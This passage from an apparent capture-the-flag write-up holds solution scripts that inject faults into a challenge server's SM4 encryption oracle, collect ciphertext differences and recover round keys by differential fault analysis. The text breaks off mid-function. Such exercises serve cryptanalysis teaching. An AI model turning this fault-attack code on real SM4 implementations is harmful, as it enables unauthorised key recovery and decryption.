io.sendlineafter(<span class="string">'your plaintext in hex:'</span>, hexlify(m))</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    c = re.findall(<span class="string">r"your ciphertext in hex:(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_fault</span><span class="params">(m, r, f, p)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'your plaintext in hex:'</span>, hexlify(m))</span><br><span class="line">    io.sendlineafter(<span class="string">'give me the value of r f p:'</span>, <span class="string">'&#123;&#125; &#123;&#125; &#123;&#125;'</span>.format(r, f, p))</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    c = re.findall(<span class="string">r"your ciphertext in hex:(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    enc_flag = get_enc_flag()</span><br><span class="line">    r, f, p = <span class="number">29</span>, <span class="number">0x22</span>, <span class="number">15</span></span><br><span class="line">    fw = open(<span class="string">'data'</span>, <span class="string">'w'</span>)</span><br><span class="line">    fw.write(enc_flag + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment"># prepared for rk[29], rk[30], rk[31]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    f = <span class="number">0x33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    <span class="comment"># prepared for rk[28]</span></span><br><span class="line">    r -= <span class="number">3</span></span><br><span class="line">    f = <span class="number">0x22</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    f = <span class="number">0x33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>exp_fault.sage</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">get_uint32_be = <span class="keyword">lambda</span> key_data:((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line">put_uint32_be = <span class="keyword">lambda</span> n:[((n&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>), ((n)&amp;<span class="number">0xff</span>)]</span><br><span class="line">get_uint128_be = <span class="keyword">lambda</span> key_data:((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">96</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">64</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">32</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line">put_uint128_be = <span class="keyword">lambda</span> n:[((n&gt;&gt;<span class="number">96</span>)&amp;<span class="number">0xffffffff</span>), ((n&gt;&gt;<span class="number">64</span>)&amp;<span class="number">0xffffffff</span>), ((n&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>), ((n)&amp;<span class="number">0xffffffff</span>)]</span><br><span class="line">rotl = <span class="keyword">lambda</span> x, n:((x &lt;&lt; n) &amp; <span class="number">0xffffffff</span>) | ((x &gt;&gt; (<span class="number">32</span> - n)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">L = <span class="keyword">lambda</span> y:(y ^^ (rotl(y, <span class="number">2</span>)) ^^ (rotl(y, <span class="number">10</span>)) ^^ (rotl(y, <span class="number">18</span>)) ^^ (rotl(y, <span class="number">24</span>)))</span><br><span class="line"></span><br><span class="line">SM4_FK = [<span class="number">0xa3b1bac6</span>,<span class="number">0x56aa3350</span>,<span class="number">0x677d9197</span>,<span class="number">0xb27022dc</span>]</span><br><span class="line">SM4_CK = [</span><br><span class="line">    <span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">generate differential dist for SBOX</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">SM4_BOXES_TABLE = [</span><br><span class="line">    <span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,</span><br><span class="line">    <span class="number">0x05</span>,<span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>,<span class="number">0x99</span>,<span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,</span><br><span class="line">    <span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,</span><br><span class="line">    <span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,<span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,</span><br><span class="line">    <span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,<span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,</span><br><span class="line">    <span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,<span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,<span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,<span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,<span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,<span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,</span><br><span class="line">    <span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,<span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,<span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,</span><br><span class="line">    <span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,<span class="number">0x0a</span>,<span class="number">0xc1</span>,</span><br><span class="line">    <span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x48</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">diff_dist = dict()</span><br><span class="line"><span class="comment"># initiate dist by set</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        diff_dist[(i, j)] = set()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        pt_diff = i ^^ j</span><br><span class="line">        ct_diff = SM4_BOXES_TABLE[i] ^^ SM4_BOXES_TABLE[j]</span><br><span class="line">        diff_dist[(pt_diff, ct_diff)].add(i)</span><br><span class="line">        diff_dist[(pt_diff, ct_diff)].add(j)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">get data for DFA attack</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">enc_flag, cipher1, cipher2 = <span class="literal">None</span>, [], []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fr:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fr:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            enc_flag = line.strip()</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">1</span> &lt;= i &lt;= <span class="number">10</span>:</span><br><span class="line">            c_data = re.findall(<span class="string">r"\((.*),(.*),(.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            ct, ct_ast, ct_diff = c_data[<span class="number">0</span>], c_data[<span class="number">1</span>], c_data[<span class="number">2</span>]</span><br><span class="line">            ct_list = put_uint128_be(int(ct, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            <span class="comment"># ct_ast_list = put_uint128_be(int(ct_ast, 16))[::-1]</span></span><br><span class="line">            ct_diff_list = put_uint128_be(int(ct_diff, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            cipher1.append((get_uint128_be(ct_list), get_uint128_be(ct_diff_list)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c_data = re.findall(<span class="string">r"\((.*),(.*),(.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            ct, ct_ast, ct_diff = c_data[<span class="number">0</span>], c_data[<span class="number">1</span>], c_data[<span class="number">2</span>]</span><br><span class="line">            ct_list = put_uint128_be(int(ct, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            ct_ast_list = put_uint128_be(int(ct_ast, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            cipher2.append((get_uint128_be(ct_list), get_uint128_be(ct_ast_list)))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">COEF prepared for function `inv_L`</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">coef_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    cur_coef_list = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    cur_coef_list[i] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">2</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">10</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">18</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">24</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    coef_list.append(cur_coef_list)</span><br><span class="line">COEF = (Matrix(GF(<span class="number">2</span>), coef_list).T).inverse()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_L</span><span class="params">(ct)</span>:</span></span><br><span class="line">    ct = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(ct)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">'0'</span>)]</span><br><span class="line">    C = Matrix(GF(<span class="number">2</span>), ct)</span><br><span class="line">    M = C * COEF</span><br><span class="line">    mt = int(<span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> M[<span class="number">0</span>]), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mt</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">use a round key to decrypt(only one round)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_one_round</span><span class="params">(cipher, rk)</span>:</span></span><br><span class="line">    cipher_list = put_uint128_be(cipher)</span><br><span class="line">    x = put_uint32_be(cipher_list[<span class="number">0</span>] ^^ cipher_list[<span class="number">1</span>] ^^ cipher_list[<span class="number">2</span>] ^^ rk)</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        y.append(SM4_BOXES_TABLE[x[i]])</span><br><span class="line">    y = get_uint32_be(y)</span><br><span class="line">    y = L(y)</span><br><span class="line">    new_cipher_list = [y ^^ cipher_list[<span class="number">3</span>], cipher_list[<span class="number">0</span>], cipher_list[<span class="number">1</span>], cipher_list[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> get_uint128_be(new_cipher_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_key</span><span class="params">(key, i)</span>:</span></span><br><span class="line">    key1, key2, key3, key4 = key[<span class="number">0</span>], key[<span class="number">1</span>], key[<span class="number">2</span>], key[<span class="number">3</span>]</span><br><span class="line">    k_in = put_uint32_be(key1 ^^ key2 ^^ key3 ^^ SM4_CK[i])</span><br><span class="line">    k_out = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        k_out.append(SM4_BOXES_TABLE[k_in[i]])</span><br><span class="line">    k_out = 